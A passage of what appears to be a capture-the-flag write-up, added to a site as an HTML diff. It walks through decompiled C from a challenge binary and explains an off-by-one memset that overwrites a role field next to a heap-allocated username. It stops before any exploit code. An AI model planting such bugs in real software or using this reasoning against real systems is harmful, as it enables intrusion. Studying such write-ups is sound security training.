+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">user_register</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Are you sure about your username choice? (y/n)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;y&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34;User registered successfully.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_edit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Checking the main method, we can see that before going to the <code>menu</code> function, it will ask us to:</p>
+<ul>
+<li>Register our username</li>
+<li>Ask again whether we want to edit the username or not before going to the <code>menu</code> function.</li>
+</ul>
+<p>Let&rsquo;s try to check the <code>setup</code> first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">setup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">read_banner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">engines</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x80uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">curr_user</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x110uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="n">curr_user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, there is a global variable called <code>curr_user</code>, which is a pointer to a chunk with size 0x110. And then it set the <code>curr_user+0x100</code> value to <code>2</code>.</p>
+<p>Let&rsquo;s try to check the <code>user_register</code> function first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">user_register</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-110h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-108h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-100h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-F8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-F0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-E8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-E0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-D8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-D0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-C8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-C0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// [rsp+58h] [rbp-B8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-B0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-A8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+70h] [rbp-A0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [rsp+78h] [rbp-98h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-90h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-88h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [rsp+90h] [rbp-80h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// [rsp+98h] [rbp-78h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// [rsp+A0h] [rbp-70h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// [rsp+A8h] [rbp-68h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v23</span><span class="p">;</span> <span class="c1">// [rsp+B0h] [rbp-60h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v24</span><span class="p">;</span> <span class="c1">// [rsp+B8h] [rbp-58h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v25</span><span class="p">;</span> <span class="c1">// [rsp+C0h] [rbp-50h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v26</span><span class="p">;</span> <span class="c1">// [rsp+C8h] [rbp-48h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v27</span><span class="p">;</span> <span class="c1">// [rsp+D0h] [rbp-40h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v28</span><span class="p">;</span> <span class="c1">// [rsp+D8h] [rbp-38h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v29</span><span class="p">;</span> <span class="c1">// [rsp+E0h] [rbp-30h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v30</span><span class="p">;</span> <span class="c1">// [rsp+E8h] [rbp-28h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v31</span><span class="p">;</span> <span class="c1">// [rsp+F0h] [rbp-20h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v32</span><span class="p">;</span> <span class="c1">// [rsp+F8h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v33</span><span class="p">;</span> <span class="c1">// [rsp+108h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v33</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;&lt;===[ Register ]===&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v12</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v13</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v14</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v15</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v16</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v17</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v18</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v19</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v20</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v21</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v22</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v23</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v24</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v25</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v26</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v27</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v28</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v29</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v30</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v31</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v32</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter a username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">read_input</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="mi">256LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strncpy</span><span class="p">(</span><span class="n">curr_user</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">33</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">curr_user</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v33</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Reading through the code, it just reads the username input, stores it in <code>curr_user</code>, and then stores the length as well in the <code>curr_user</code> struct. Let&rsquo;s move to the <code>user_edit</code> function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">user_edit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;&lt;===[ Edit Username ]===&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;New username size: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">getchar</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">curr_user</span> <span class="o">+</span> <span class="mi">33</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">n</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">s</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Please replace the memory catridge.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter your new username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span> <span class="o">+</span> <span class="n">strcspn</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">strncpy</span><span class="p">(</span><span class="n">curr_user</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">,</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34;User updated successfully!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log_message</span><span class="p">(</span><span class="mi">3LL</span><span class="p">,</span> <span class="s">&#34;Can&#39;t be larger than the current username.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, there is off-by-one bug in this code. Suppose that our username length is <code>256</code>, that means the max value of <code>n</code> is also <code>256</code>. Notice that there is a line of code that call <code>memset(s, 0, n+1)</code>. That means, if the <code>n</code> is set to <code>256</code> (<code>0x100</code>), it will set <code>257</code> bytes to null. The username size is <code>0x100</code>, which means that this memset is overwriting one byte next to the curr_user username with null byte, which is the <code>curr_user+0x100</code> that is set during the <code>setup</code>. We don&rsquo;t know yet what is that value, so let&rsquo;s move to disassemble the next function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">menu</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">option</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_banner</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_current_role</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">option</span> <span class="o">=</span> <span class="n">read_option</span><span class="p">(</span><span class="mi">5LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;selection: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">option</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span> <span class="n">option</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">1u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">configure_engine</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">2u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">check_engines</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">3u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">change_route</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="mi">4u</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">view_route</span><span class="p">();</span>
